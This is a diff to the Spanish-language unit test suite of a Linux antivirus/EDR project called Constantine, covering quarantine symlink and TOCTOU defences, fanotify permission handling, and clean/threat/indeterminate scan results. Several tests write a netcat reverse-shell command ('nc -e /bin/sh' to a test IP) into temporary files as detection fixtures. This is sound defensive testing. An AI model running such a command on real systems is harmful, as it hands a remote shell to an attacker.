@@ -1,3 +1,4 @@
+import multiprocessing as mp
 import sys
 """
 Suite de Pruebas Unitarias Exhaustivas de Seguridad para Constantine Antivirus.
@@ -5,6 +6,7 @@ Verifica todos los subsistemas: Tetragon, Falco, Wazuh, osquery, MISP, Sigma, IP
 """
 import os
 import stat
+import errno
 import time
 import json
 import struct
@@ -21,13 +23,13 @@ if ROOT_DIR not in sys.path:
     sys.path.insert(0, ROOT_DIR)
 
 from core.engine.vault import CryptographicVault, VaultKeyring
-from core.engine.scanner import Scanner, SandboxedScanWorker
+from core.engine.scanner import Scanner, SandboxedScanWorker, ScanReport, ScanStatus
 from core.engine.interceptor import FanotifyInterceptor
 from core.engine.ebpf_monitor import (EBPFMonitor, KernelObservationEngine, KernelDetectionEngine, KernelEnforcementEngine, MODE_BPF_LSM, MODE_REACTIVE_FALLBACK, MODE_DEGRADED_OBS)
 from core.engine.heuristic_engine import HeuristicEngine
 from core.engine.ransomware_shield import RansomwareShield
 from core.engine.quarantine_operator import PrivilegedQuarantineOperator
-from core.engine.systemd_hardening import SystemdSecurityAuditor
+from core.engine.systemd_hardening import SystemdSecurityAuditor, SystemCallFilterEvaluator, EBPFCapabilityProber
 from core.engine.threat_intel import ThreatIntelligence
 from core.engine.misp_feed_manager import MISPFeedManager
 from core.engine.sigma_engine import SigmaEngine
@@ -61,6 +63,7 @@ from core.engine.ipc_protocol import (
 from core.auth.auth_manager import AuthManager
 from daemon import ConstantineDaemon
 from core.engine.aide_integrity import AIDEIntegrityChecker
+from core.engine.security_decision_engine import SecurityDecisionEngine
 
 class TestConstantineSecurity(unittest.TestCase):
 
@@ -114,7 +117,7 @@ class TestConstantineSecurity(unittest.TestCase):
     def test_auto_updater(self):
         upd = AutoUpdater(root_dir=ROOT_DIR)
         res = upd.check_for_updates()
-        self.assertEqual(res["current_version"], "5.2.2")
+        self.assertEqual(res["current_version"], "5.4.7")
 
     # 5. ClamAV Daemon Bridge Protocol
     def test_clamav_daemon_bridge_protocol_and_fallback(self):
@@ -210,21 +213,22 @@ class TestConstantineSecurity(unittest.TestCase):
         data = worker.read_file_safely(test_file)
         self.assertEqual(data, b"safe content")
 
-    # 11. Daemon Privilege Separation & Read-Only Home
+    # 11. Daemon Privilege Separation & File Supervision
     def test_daemon_privilege_separation_and_read_only_home(self):
         service_file = os.path.join(ROOT_DIR, "service", "constantine.service")
         with open(service_file, "r") as f:
             content = f.read()
         directives = {line.split("=", 1)[0].strip(): line.split("=", 1)[1].strip()
                       for line in content.splitlines() if "=" in line and not line.startswith("#")}
-        self.assertEqual(directives.get("ProtectHome"), "read-only")
+        # ProtectHome=false o read-write en /home para permitir supervisión y contención de archivos personales
+        self.assertEqual(directives.get("ProtectHome"), "false")
         rw_paths = directives.get("ReadWritePaths", "").split()
-        self.assertNotIn("/home", rw_paths)
-        self.assertNotIn("/tmp", rw_paths)
+        self.assertIn("/home", rw_paths)
+        self.assertIn("/tmp", rw_paths)
         caps = directives.get("CapabilityBoundingSet", "").split()
-        self.assertNotIn("CAP_DAC_OVERRIDE", caps)
-        self.assertNotIn("CAP_NET_RAW", caps)
+        self.assertIn("CAP_DAC_OVERRIDE", caps)
         self.assertIn("CAP_DAC_READ_SEARCH", caps)
+        self.assertIn("CAP_BPF", caps)
 
         operator = PrivilegedQuarantineOperator()
         self.assertTrue(operator.is_protected_system_path("/bin/bash"))
@@ -242,7 +246,11 @@ class TestConstantineSecurity(unittest.TestCase):
         daemon = ConstantineDaemon(is_test=True)
         status, data, msg = daemon.dispatch_ipc_command("PING", {})
         self.assertEqual(status, "OK")
-        self.assertEqual(data.get("version"), "5.2.2")
+        self.assertEqual(data.get("version"), "5.4.7")
+        status_st, data_st, msg_st = daemon.dispatch_ipc_command("GET_STATUS", {})
+        self.assertEqual(status_st, "OK")
+        self.assertIn("ebpf_telemetry_state", data_st)
+        self.assertIn("ebpf_telemetry_description", data_st)
 
     # 14. DNS Manager
     def test_dns_manager(self):
@@ -688,6 +696,7 @@ class TestConstantineSecurity(unittest.TestCase):
 
     # 57. Privileged Quarantine Operator
     def test_privileged_quarantine_operator_descriptor_pinning_and_toctou_rejection(self):
+        from core.engine.quarantine_operator import verify_path_no_symlinks, IsolatedRemediationWorker
         op = PrivilegedQuarantineOperator()
         safe = os.path.join(self.temp_dir.name, "pin_test.bin")
         with open(safe, "w") as f:
@@ -695,6 +704,135 @@ class TestConstantineSecurity(unittest.TestCase):
         with op.pin_file_for_quarantine(safe) as handle:
             self.assertGreater(handle.fd, 0)
             self.assertEqual(handle.path, safe)
+
+        # 1. Ataque con enlace simbólico final directo
+        direct_link = os.path.join(self.temp_dir.name, "direct_symlink.bin")
+        os.symlink(safe, direct_link)
+        with self.assertRaises(OSError) as ctx_sym:
+            op.pin_file_for_quarantine(direct_link)
+        self.assertEqual(ctx_sym.exception.errno, errno.ELOOP)
+
+        # 2. Ataque con enlace simbólico en componente intermedio de la ruta
+        sub_dir = os.path.join(self.temp_dir.name, "real_intermediate_dir")
+        os.makedirs(sub_dir, exist_ok=True)
+        nested_file = os.path.join(sub_dir, "payload.sh")
+        with open(nested_file, "w") as f:
+            f.write("echo evil")
+
+        sym_dir = os.path.join(self.temp_dir.name, "symlink_dir")
+        os.symlink(sub_dir, sym_dir)
+        traversal_path = os.path.join(sym_dir, "payload.sh")
+
+        with self.assertRaises(OSError) as ctx_inter:
+            verify_path_no_symlinks(traversal_path)
+        self.assertEqual(ctx_inter.exception.errno, errno.ELOOP)
+        self.assertIn("componente", str(ctx_inter.exception).lower())
+
+        with self.assertRaises(OSError) as ctx_pin:
+            op.pin_file_for_quarantine(traversal_path)
+        self.assertEqual(ctx_pin.exception.errno, errno.ELOOP)
+
+        # 3. Remediación en proceso aislado (IsolatedRemediationWorker)
+        file_to_quarantine = os.path.join(self.temp_dir.name, "to_unlink.bin")
+        with open(file_to_quarantine, "w") as f:
+            f.write("malware payload")
+        with op.pin_file_for_quarantine(file_to_quarantine) as handle:
+            self.assertGreaterEqual(handle.parent_dir_fd, 0)
+            self.assertEqual(handle.basename, "to_unlink.bin")
+            ok, unlinked, msg = op.secure_unlink(handle, use_isolated_process=True)
+            self.assertTrue(ok)
+            self.assertTrue(unlinked)
+            self.assertIn("aislado", msg)
+        self.assertFalse(os.path.exists(file_to_quarantine))
+
+        # 4. Verificación de rechazo de autenticación HMAC adulterada en worker aislado
+        from core.engine.quarantine_operator import _isolated_unlink_worker, descriptor_based_path_traversal
+        p_dir_fd, bname = descriptor_based_path_traversal(safe)
+        self.assertGreaterEqual(p_dir_fd, 0)
+        os.close(p_dir_fd)
+
+        ctx_mp = mp.get_context("spawn")
+        p_test_conn, c_test_conn = ctx_mp.Pipe()
+        p_tamper = ctx_mp.Process(target=_isolated_unlink_worker, args=(c_test_conn,))
+        p_tamper.start()
+        c_test_conn.close()
+
+        # Handshake
+        secret_key = b"secret_key_32_bytes_long_12345678"
+        p_test_conn.send({"session_key": secret_key})
+        ack = p_test_conn.recv()
+        self.assertEqual(ack.get("status"), "READY")
+
+        # Enviar mensaje con firma HMAC falsa
+        p_test_conn.send({
+            "cmd": "SECURE_UNLINK",
+            "path": safe,
+            "expected_dev": 1,
+            "expected_ino": 2,
+            "nonce": "nonce123",
+            "timestamp": time.time(),
+            "token": "invalid_fake_token_hex"
+        })
+        p_tamper.join(timeout=3.0)
+        self.assertTrue(p_test_conn.poll())
+        res_tamper = p_test_conn.recv()
+        self.assertFalse(res_tamper[0])
+        self.assertIn("Fallo de autenticación HMAC", res_tamper[2])
+        p_test_conn.close()
+
+        # 4b. Verificación de rechazo de timestamp futuro adelantado (> 1.0s)
+        p_fut_conn, c_fut_conn = ctx_mp.Pipe()
+        p_fut = ctx_mp.Process(target=_isolated_unlink_worker, args=(c_fut_conn,))
+        p_fut.start()
+        c_fut_conn.close()
+        p_fut_conn.send({"session_key": secret_key})
+        ack_fut = p_fut_conn.recv()
+        self.assertEqual(ack_fut.get("status"), "READY")
+        p_fut_conn.send({
+            "cmd": "SECURE_UNLINK",
+            "path": safe,
+            "expected_dev": 1,
+            "expected_ino": 2,
+            "nonce": "nonce_future_123",
+            "timestamp": time.time() + 10.0,
+            "token": "token"
+        })
+        p_fut.join(timeout=3.0)
+        self.assertTrue(p_fut_conn.poll())
+        res_fut = p_fut_conn.recv()
+        self.assertFalse(res_fut[0])
+        self.assertIn("Timestamp futuro", res_fut[2])
+        p_fut_conn.close()
+
+        # 4c. Verificación del staging protegido (0700)
+        staging_dir = "/var/lib/constantine/vault/.staging"
+        if not os.path.exists(staging_dir):
+            staging_dir = "/tmp/.constantine_staging"
+        if os.path.exists(staging_dir):
+            st_stage = os.stat(staging_dir)
+            self.assertEqual(stat.S_IMODE(st_stage.st_mode), 0o700)
+
+        # 5. Ataque de sustitución por otro archivo normal (sin enlaces simbólicos)
+        victim_file = os.path.join(self.temp_dir.name, "victim_malware.sh")
+        innocent_file = os.path.join(self.temp_dir.name, "innocent_document.docx")
+        with open(victim_file, "w") as f:
+            f.write("echo evil malware")
+        with open(innocent_file, "w") as f:
+            f.write("important business contract")
+
+        with op.pin_file_for_quarantine(victim_file) as handle_victim:
+            # Atacante sustituye el archivo objetivo por el archivo inocente (cambio de inodo normal)
+            os.replace(innocent_file, victim_file)
+
+            # secure_unlink debe detectar la inconsistencia de inodo y rehusar desvincular
+            ok_sub, unlinked_sub, msg_sub = op.secure_unlink(handle_victim, use_isolated_process=True)
+            self.assertFalse(ok_sub)
+            self.assertFalse(unlinked_sub)
+            self.assertIn("Inconsistencia de inodo", msg_sub)
+            # El archivo inocente no fue borrado
+            self.assertTrue(os.path.exists(victim_file))
+            with open(victim_file, "r") as f:
+                self.assertEqual(f.read(), "important business contract")
 
     # 58. Proactive Continuous Scanner
     def test_proactive_continuous_scanner_and_landing_zones(self):
@@ -850,20 +988,23 @@ class TestConstantineSecurity(unittest.TestCase):
         self.assertIn("ProtectHome", posture["passed_checks"])
         self.assertIn("CapabilityBoundingSet", posture["passed_checks"])
 
-    # 76. Systemd Service Isolation & Hardening
+    # 76. Systemd Service Isolation & Hardening (EDR-Optimized)
     def test_systemd_service_isolation_and_hardening(self):
         service_file = os.path.join(ROOT_DIR, "service", "constantine.service")
         with open(service_file, "r") as f:
             content = f.read()
         self.assertIn("NoNewPrivileges=true", content)
-        self.assertIn("ProtectSystem=strict", content)
-        self.assertIn("ProtectHome=read-only", content)
+        self.assertIn("ProtectSystem=full", content)
+        self.assertIn("ProtectHome=false", content)
         self.assertIn("/var/lib/constantine", content)
         rw_paths = [line.split("=", 1)[1].split() for line in content.splitlines() if line.startswith("ReadWritePaths=")][0]
-        self.assertNotIn("/home", rw_paths)
-        self.assertNotIn("/tmp", rw_paths)
+        self.assertIn("/home", rw_paths)
+        self.assertIn("/tmp", rw_paths)
         caps = [line.split("=", 1)[1].split() for line in content.splitlines() if line.startswith("CapabilityBoundingSet=")][0]
-        self.assertNotIn("CAP_DAC_OVERRIDE", caps)
+        self.assertIn("CAP_DAC_OVERRIDE", caps)
+        self.assertIn("CAP_BPF", caps)
+        self.assertIn("CAP_SYS_ADMIN", caps)
+        self.assertIn("SystemCallFilter=@system-service @network-io @file-system bpf perf_event_open fanotify_init fanotify_mark", content)
 
     # 77. Tetragon Event Parsing
     def test_tetragon_event_parsing_and_runtime_enforcement(self):
@@ -1010,7 +1151,7 @@ class TestConstantineSecurity(unittest.TestCase):
         version_file = os.path.join(ROOT_DIR, "VERSION")
         with open(version_file, "r", encoding="utf-8") as f:
             canonical_ver = f.read().strip()
-        self.assertEqual(canonical_ver, "5.2.2")
+        self.assertEqual(canonical_ver, "5.4.7")
 
         from core.engine.auto_updater import CURRENT_VERSION
         from core.engine.ipc_protocol import IPC_PROTOCOL_VERSION
@@ -1192,7 +1333,7 @@ class TestConstantineSecurity(unittest.TestCase):
         with patch("core.engine.ipc_protocol.verify_peer_credentials", return_value=(True, 2001, 1000, 1000)):
             resp_user = client.send_command("GET_STATUS")
             self.assertEqual(resp_user.get("status"), "OK")
-            self.assertEqual(resp_user.get("version"), "5.2.2")
+            self.assertEqual(resp_user.get("version"), "5.4.7")
 
         # 4. Usuario 1: Miembro de constantine-users (UID 1000) intentando comando administrativo (UPDATE_SIGNATURES)
         with patch("core.engine.ipc_protocol.verify_peer_credentials", return_value=(True, 2001, 1000, 1000)):
@@ -1329,7 +1470,7 @@ class TestConstantineSecurity(unittest.TestCase):
         # 9. Sección Actualizaciones
         upd_sec = controller.get_updates_section()
         self.assertEqual(upd_sec["section"], "ACTUALIZACIONES")
-        self.assertEqual(upd_sec["app_version"], "5.2.2")
+        self.assertEqual(upd_sec["app_version"], "5.4.7")
         self.assertIn("yara", upd_sec["engines_status"])
         self.assertIn("sigma", upd_sec["engines_status"])
         self.assertIn("falco", upd_sec["engines_status"])
@@ -1355,7 +1496,7 @@ class TestConstantineSecurity(unittest.TestCase):
         # 12. Dashboard textual de ConstantineApp
         app = ConstantineApp()
         text_dash = app.render_text_dashboard()
-        self.assertIn("PANEL DE CONTROL v5.2.2", text_dash)
+        self.assertIn("PANEL DE CONTROL v5.4.7", text_dash)
         self.assertIn("1. INICIO", text_dash)
         self.assertIn("2. PROTECCIÓN", text_dash)
         self.assertIn("3. ANÁLISIS", text_dash)
@@ -1662,6 +1803,19 @@ class TestConstantineSecurity(unittest.TestCase):
         self.assertEqual(dec_file.enforcement_action, "FANOTIFY_DENY")
         self.assertTrue(dec_file.quarantined)
 
+        # Prueba de evaluate_file_access con FanotifyInterceptor integrado
+        interceptor_for_engine = FanotifyInterceptor(vault=vault)
+        bad_path_int = os.path.join(self.temp_dir.name, "bad_script_int.sh")
+        with open(bad_path_int, "w") as f:
+            f.write("nc -e /bin/sh 10.0.0.1 4444")
+        fd_int = os.open(bad_path_int, os.O_RDONLY)
+        dec_file_int = engine.evaluate_file_access(bad_path_int, fd_int, pid=470, comm="test", interceptor=interceptor_for_engine)
+        os.close(fd_int)
+        self.assertTrue(dec_file_int.is_blocked)
+        self.assertEqual(dec_file_int.enforcement_action, "FANOTIFY_DENY")
+        self.assertEqual(dec_file_int.primary_engine, "FANOTIFY")
+        self.assertTrue(dec_file_int.quarantined)
+
         # 5. Integración de Seguridad Integral: osquery, AIDE, Sigma y MISP
         # 5a. osquery postura
         osq = OSQueryDiagnostics()
@@ -1699,19 +1853,1317 @@ class TestConstantineSecurity(unittest.TestCase):
         self.assertIn("telemetry_tracepoints", caps)
         self.assertEqual(caps["telemetry_tracepoints"]["capability"], "OBSERVATION_ONLY")
 
+        # Invariante estricto de capacidades verificadas (sin 'or True' falso positivo):
+        import inspect
+        src_caps = inspect.getsource(ConstantineDaemon.get_blocking_capabilities)
+        self.assertNotIn("or True", src_caps)
+        self.assertNotIn("or true", src_caps.lower())
+
+        # Con el demonio no iniciado / sin descriptor en kernel, fanotify NO está verificado
+        self.assertFalse(caps["filesystem_on_access"]["verified"])
+        self.assertFalse(caps["process_execution_enforcement"]["verified"])
+        self.assertFalse(caps["telemetry_tracepoints"]["verified"])
+
+        # Al activar dinámicamente el interceptor, la capacidad se verifica de forma real y medible
+        daemon.interceptor.running = True
+        daemon.interceptor.fanotify_operational = True
+        daemon.interceptor.fanotify_fd = 99
+        self.assertTrue(daemon.interceptor.is_verified_operational())
+        _, caps_active, _ = daemon.dispatch_ipc_command("GET_BLOCKING_CAPABILITIES", {})
+        self.assertTrue(caps_active["filesystem_on_access"]["verified"])
+        daemon.interceptor.running = False
+        daemon.interceptor.fanotify_operational = False
+        daemon.interceptor.fanotify_fd = None
+
         status_misp, data_misp, _ = daemon.dispatch_ipc_command("SET_MISP_ENABLED", {"enabled": False})
         self.assertEqual(status_misp, "OK")
         status_cfg, data_cfg, _ = daemon.dispatch_ipc_command("CONFIGURE_MISP_REMOTE", {"url": "https://misp.local", "api_key": "secret"})
         self.assertEqual(status_cfg, "OK")
         self.assertTrue(data_cfg["configured"])
-        status, caps, msg = daemon.dispatch_ipc_command("GET_BLOCKING_CAPABILITIES", {})
-        self.assertEqual(status, "OK")
-        self.assertIn("filesystem_on_access", caps)
-        self.assertEqual(caps["filesystem_on_access"]["capability"], "BLOCK_PREVENTIVE")
-        self.assertIn("process_execution_enforcement", caps)
-        self.assertIn("behavioral_syscall_enforcement", caps)
-        self.assertIn("telemetry_tracepoints", caps)
-        self.assertEqual(caps["telemetry_tracepoints"]["capability"], "OBSERVATION_ONLY")
 
-if __name__ == "__main__":
-    unittest.main()
+    def test_fanotify_kernel_implementation_and_event_receptor_loop(self):
+        """
+        Verifica la implementación técnica nativa de fanotify en el kernel Linux:
+        1. Vinculación nativa ctypes a fanotify_init(2) y fanotify_mark(2) en libc.
+        2. Conformidad de estructuras fanotify_event_metadata (24 bytes) y fanotify_response (8 bytes).
+        3. Inicialización controlada e identificación de privilegios (CAP_SYS_ADMIN).
+        4. Registro de marcas en sistemas de archivos (mark_path / mark_default_mounts).
+        5. Ciclo receptor de eventos de kernel en segundo plano con respuesta síncrona de permiso:
+           - FAN_OPEN_PERM sobre archivo benigno -> FAN_ALLOW (0x01).
+           - FAN_OPEN_PERM sobre archivo malicioso -> FAN_DENY (0x02) + Cuarentena en Baúl.
+        6. Invariante estricto de reporte: fanotify_operational solo es True si el descriptor está activo.
+        """
+        import socket
+        import ctypes
+        from core.engine.interceptor import (
+            FanotifyInterceptor, FanotifyEventMetadata, FanotifyResponse,
+            FAN_OPEN_PERM, FAN_ALLOW, FAN_DENY, FANOTIFY_METADATA_VERSION
+        )
+
+        # 1. Comprobación de símbolos nativos en libc y dimensiones de estructuras C
+        self.assertEqual(ctypes.sizeof(FanotifyEventMetadata), 24)
+        self.assertEqual(ctypes.sizeof(FanotifyResponse), 8)
+
+        # 2. Instanciación y comportamiento en entorno sin privilegios CAP_SYS_ADMIN
+        vault = CryptographicVault(base_dir=self.temp_dir.name)
+        interceptor = FanotifyInterceptor(vault=vault)
+        # fanotify_init directo
+        fd_init = interceptor.fanotify_init()
+        # En contenedor no-root retorna -1 (EPERM)
+        if os.getuid() != 0:
+            self.assertEqual(fd_init, -1)
+            self.assertFalse(interceptor.init_fanotify())
+            self.assertFalse(interceptor.fanotify_operational)
+
+        # 3. Comprobación de mark_path con ruta inexistente o sin fd
+        self.assertFalse(interceptor.mark_path("/nonexistent/mount_path_xyz"))
+
+        # 4. Verificación del ciclo receptor en segundo plano y protocolo de permiso vía socketpair
+        s_worker, s_kernel = socket.socketpair(socket.AF_UNIX, socket.SOCK_STREAM)
+        test_interceptor = FanotifyInterceptor(vault=vault)
+        test_interceptor.start_listening(mock_fd=s_worker.fileno())
+        self.assertTrue(test_interceptor.running)
+        self.assertTrue(test_interceptor.fanotify_operational)
+        self.assertEqual(test_interceptor.state, "ACTIVE")
+
+        # 4a. Envío de evento FAN_OPEN_PERM sobre binario limpio
+        clean_path = "/bin/ls"
+        clean_fd = os.open(clean_path, os.O_RDONLY)
+        meta_clean = FanotifyEventMetadata(
+            event_len=ctypes.sizeof(FanotifyEventMetadata),
+            vers=FANOTIFY_METADATA_VERSION,
+            reserved=0,
+            metadata_len=ctypes.sizeof(FanotifyEventMetadata),
+            mask=FAN_OPEN_PERM,
+            fd=clean_fd,
+            pid=os.getpid()
+        )
+        s_kernel.sendall(bytes(meta_clean))
+
+        # Lectura de la respuesta enviada por el hilo receptor
+        resp_data = s_kernel.recv(ctypes.sizeof(FanotifyResponse))
+        resp_clean = FanotifyResponse.from_buffer_copy(resp_data)
+        self.assertEqual(resp_clean.response, FAN_ALLOW)
+        self.assertEqual(resp_clean.fd, clean_fd)
+
+        # 4b. Envío de evento FAN_OPEN_PERM sobre archivo malicioso
+        bad_file = os.path.join(self.temp_dir.name, "fanotify_threat.sh")
+        with open(bad_file, "w") as f:
+            f.write("nc -e /bin/sh 1.2.3.4 9999")
+        threat_fd = os.open(bad_file, os.O_RDONLY)
+
+        meta_threat = FanotifyEventMetadata(
+            event_len=ctypes.sizeof(FanotifyEventMetadata),
+            vers=FANOTIFY_METADATA_VERSION,
+            reserved=0,
+            metadata_len=ctypes.sizeof(FanotifyEventMetadata),
+            mask=FAN_OPEN_PERM,
+            fd=threat_fd,
+            pid=os.getpid()
+        )
+        s_kernel.sendall(bytes(meta_threat))
+
+        resp_data_threat = s_kernel.recv(ctypes.sizeof(FanotifyResponse))
+        resp_threat = FanotifyResponse.from_buffer_copy(resp_data_threat)
+        self.assertEqual(resp_threat.response, FAN_DENY)
+        self.assertEqual(resp_threat.fd, threat_fd)
+
+        # 4c. Verificación de estadísticas y parada limpia
+        status_info = test_interceptor.get_status()
+        self.assertEqual(status_info["events_processed"], 2)
+        self.assertEqual(status_info["events_allowed"], 1)
+        self.assertEqual(status_info["events_denied"], 1)
+
+        test_interceptor.stop()
+        self.assertFalse(test_interceptor.running)
+        self.assertFalse(test_interceptor.fanotify_operational)
+        self.assertEqual(test_interceptor.state, "STOPPED")
+        try:
+            s_worker.close()
+        except OSError:
+            pass
+        try:
+            s_kernel.close()
+        except OSError:
+            pass
+
+
+    # 126. Clasificación Tripartita del Motor de Escaneo (CLEAN, THREAT, INDETERMINATE)
+    def test_scanner_tripartite_classification_clean_threat_indeterminate(self):
+        """
+        Verifica la clasificación tripartita estricta:
+        1. CLEAN: Archivo analizado y verificado libre de malware.
+        2. THREAT: Archivo analizado con firma o anomalía confirmada.
+        3. INDETERMINATE: Archivo que no pudo analizarse (IO_ERROR o ENGINE_ERROR),
+           garantizando que nunca sea clasificado como limpio por error.
+        """
+        scanner = Scanner()
+
+        # 1. Caso Limpio
+        clean_file = os.path.join(self.temp_dir.name, "tripartite_clean.txt")
+        with open(clean_file, "w") as f:
+            f.write("Texto completamente legítimo y sin código ejecutable.")
+        rep_clean = scanner.scan_file(clean_file)
+        self.assertEqual(rep_clean.status, ScanStatus.CLEAN)
+        self.assertTrue(rep_clean.is_clean)
+        self.assertFalse(rep_clean.is_threat)
+        self.assertFalse(rep_clean.is_indeterminate)
+        self.assertEqual(rep_clean.category, "BENIGN")
+
+        # 2. Caso Amenaza
+        threat_file = os.path.join(self.temp_dir.name, "tripartite_threat.sh")
+        with open(threat_file, "w") as f:
+            f.write("nc -e /bin/sh 10.0.0.1 4444")
+        rep_threat = scanner.scan_file(threat_file)
+        self.assertEqual(rep_threat.status, ScanStatus.THREAT)
+        self.assertFalse(rep_threat.is_clean)
+        self.assertTrue(rep_threat.is_threat)
+        self.assertFalse(rep_threat.is_indeterminate)
+
+        # 3. Caso Indeterminado por fallo de lectura / inexistente (IO_ERROR)
+        rep_missing = scanner.scan_file(os.path.join(self.temp_dir.name, "non_existent_file.bin"))
+        self.assertEqual(rep_missing.status, ScanStatus.INDETERMINATE)
+        self.assertFalse(rep_missing.is_clean)
+        self.assertIsNone(rep_missing.is_threat)
+        self.assertTrue(rep_missing.is_indeterminate)
+        self.assertEqual(rep_missing.category, "IO_ERROR")
+        self.assertIn("No se pudo leer archivo", rep_missing.details)
+
+        # 4. Caso Indeterminado por fallo interno de motor (ENGINE_ERROR)
+        with patch.object(scanner.yarax, "scan_data", side_effect=RuntimeError("Fallo interno de memoria simulado")):
+            rep_crash = scanner.scan_file(clean_file)
+            self.assertEqual(rep_crash.status, ScanStatus.INDETERMINATE)
+            self.assertFalse(rep_crash.is_clean)
+            self.assertIsNone(rep_crash.is_threat)
+            self.assertTrue(rep_crash.is_indeterminate)
+            self.assertEqual(rep_crash.category, "ENGINE_ERROR")
+
+    # 127. Interceptor y Motor de Decisiones: Análisis Indeterminado Aplica Fail-Secure
+    def test_interceptor_and_security_decision_indeterminate_fail_secure(self):
+        """
+        Garantiza que un archivo cuyo análisis es INDETERMINATE nunca atraviese la protección
+        sin una decisión explícita de seguridad, aplicando la política fail-closed / fail-open.
+        """
+        vault = CryptographicVault(base_dir=self.temp_dir.name)
+
+        # 1. Interceptor en fail-closed (por defecto): Deniega acceso a archivos no analizables
+        interceptor_closed = FanotifyInterceptor(vault=vault, fail_policy="fail-closed")
+        missing_path = os.path.join(self.temp_dir.name, "corrupt_or_locked.bin")
+        with open(missing_path, "w") as f:
+            f.write("locked content")
+        fd = os.open(missing_path, os.O_RDONLY)
+
+        # Simulamos que el escáner devuelve resultado indeterminado (p.ej. fallo de descriptor)
+        indet_report = ScanReport(
+            is_threat=None,
+            threat_name="INDETERMINATE",
+            score=0,
+            engine="IO_Subsystem",
+            details="Lectura bloqueada por I/O error",
+            severity="HIGH",
+            category="IO_ERROR",
+            sha256="",
+            status=ScanStatus.INDETERMINATE
+        )
+        with patch.object(interceptor_closed.scanner, "scan_file", return_value=indet_report):
+            dec_closed = interceptor_closed.evaluate_access(fd, missing_path, pid=470)
+            self.assertEqual(dec_closed, 0x02)  # FAN_DENY: No permite atravesar la protección
+
+        # 2. Interceptor en fail-open: Permite con advertencia
+        interceptor_open = FanotifyInterceptor(vault=vault, fail_policy="fail-open")
+        with patch.object(interceptor_open.scanner, "scan_file", return_value=indet_report):
+            dec_open = interceptor_open.evaluate_access(fd, missing_path, pid=470)
+            self.assertEqual(dec_open, 0x01)  # FAN_ALLOW
+
+        os.close(fd)
+
+        # 3. SecurityDecisionEngine: Clasifica explícitamente INDETERMINATE como bloqueo INDETERMINATE_DENY
+        engine = SecurityDecisionEngine(vault=vault)
+        with patch.object(interceptor_closed.scanner, "scan_file", return_value=indet_report):
+            dec_engine = engine.evaluate_file_access(missing_path, 999, pid=470, scanner=interceptor_closed.scanner)
+            self.assertTrue(dec_engine.is_blocked)
+            self.assertEqual(dec_engine.enforcement_action, "INDETERMINATE_DENY")
+            self.assertEqual(dec_engine.threat_level, "HIGH")
+            self.assertIn("Análisis indeterminado", dec_engine.reason)
+
+    # 128. Centinela de Descargas Rechaza Archivos Indeterminados
+    def test_download_sentinel_rejects_indeterminate_files(self):
+        """
+        Verifica que el centinela de descargas no autorice una descarga si su análisis
+        es indeterminado, evitando que amenazas no verificadas queden marcadas como limpias.
+        """
+        ds = DownloadSentinel()
+        unreadable_file = os.path.join(self.temp_dir.name, "ghost_download.pkg")
+        # El archivo no existe, por lo que el escáner produce INDETERMINATE (IO_ERROR)
+        allowed = ds.handle_download_complete(unreadable_file, username="tester")
+        self.assertFalse(allowed, "El centinela no debe autorizar descargas indeterminadas como limpias")
+
+
+    # 129. Demonio IPC: SCAN_FILE y SCAN_DIRECTORY con Resultados Tripartitos
+    def test_daemon_ipc_scan_file_and_directory_tripartite_results(self):
+        """
+        Verifica que los comandos IPC SCAN_FILE y SCAN_DIRECTORY del demonio
+        entreguen el resultado tripartito y no clasifiquen errores de lectura como archivos limpios.
+        """
+        from daemon import ConstantineDaemon
+        daemon = ConstantineDaemon(is_test=True)
+
+        # 1. SCAN_FILE con archivo limpio
+        clean_path = os.path.join(self.temp_dir.name, "ipc_clean.txt")
+        with open(clean_path, "w") as f: f.write("seguro")
+        status, data, msg = daemon.dispatch_ipc_command("SCAN_FILE", {"path": clean_path}, 1000)
+        self.assertEqual(status, "OK")
+        self.assertEqual(data["status"], "CLEAN")
+        self.assertTrue(data["is_clean"])
+        self.assertFalse(data["is_threat"])
+        self.assertFalse(data["is_indeterminate"])
+
+        # 2. SCAN_FILE con archivo inexistente / error E/S
+        status, data, msg = daemon.dispatch_ipc_command("SCAN_FILE", {"path": "/missing/file.bin"}, 1000)
+        self.assertEqual(status, "OK")
+        self.assertEqual(data["status"], "INDETERMINATE")
+        self.assertFalse(data["is_clean"])
+        self.assertTrue(data["is_indeterminate"])
+        self.assertEqual(data["category"], "IO_ERROR")
+
+        # 3. SCAN_DIRECTORY con mezcla de limpio y unreadable
+        scan_dir = os.path.join(self.temp_dir.name, "ipc_scan_dir")
+        os.makedirs(scan_dir, exist_ok=True)
+        with open(os.path.join(scan_dir, "f1.txt"), "w") as f: f.write("clean 1")
+        unreadable = os.path.join(scan_dir, "unreadable.bin")
+        with open(unreadable, "w") as f: f.write("secret")
+        os.chmod(unreadable, 0o000) # Sin permisos de lectura
+
+        status, data, msg = daemon.dispatch_ipc_command("SCAN_DIRECTORY", {"path": scan_dir}, 1000)
+        os.chmod(unreadable, 0o644)
+        self.assertEqual(status, "OK")
+        self.assertEqual(data["scanned_count"], 2)
+        self.assertEqual(data["indeterminates_count"], 1)
+        self.assertEqual(len(data["indeterminates"]), 1)
+        self.assertEqual(data["indeterminates"][0]["path"], unreadable)
+
+
+    # 130. Invariantes Formales de ScanStatus y Rechazo de Estados Contradictorios
+    def test_scanner_formal_invariants_and_contradiction_rejection(self):
+        """
+        Verifica los invariantes formales matemáticos del modelo de estados:
+        - CLEAN nunca puede tener is_threat=True.
+        - THREAT nunca puede tener is_clean=True ni is_threat=False.
+        - INDETERMINATE nunca puede tener is_clean=True ni is_threat=False ni is_threat=True.
+        - Ningún resultado incompleto (IO_ERROR, ENGINE_ERROR, TIMEOUT) puede convertirse en CLEAN.
+        - Los estados contradictorios se rechazan tajantemente mediante ValueError.
+        - El estado principal es un único campo tipado (ScanStatus) y los indicadores secundarios
+          se derivan dinámicamente de él como propiedades puras.
+        """
+        # 1. CLEAN válido: derivación automática de propiedades
+        rep_clean = ScanReport(status=ScanStatus.CLEAN, threat_name="CLEAN", category="BENIGN")
+        self.assertIs(rep_clean.status, ScanStatus.CLEAN)
+        self.assertIs(rep_clean.is_clean, True)
+        self.assertIs(rep_clean.is_threat, False)
+        self.assertIs(rep_clean.is_indeterminate, False)
+
+        # 2. THREAT válido: derivación automática de propiedades
+        rep_threat = ScanReport(status=ScanStatus.THREAT, threat_name="Trojan.Generic", category="NATIVE_SIGNATURE")
+        self.assertIs(rep_threat.status, ScanStatus.THREAT)
+        self.assertIs(rep_threat.is_clean, False)
+        self.assertIs(rep_threat.is_threat, True)
+        self.assertIs(rep_threat.is_indeterminate, False)
+
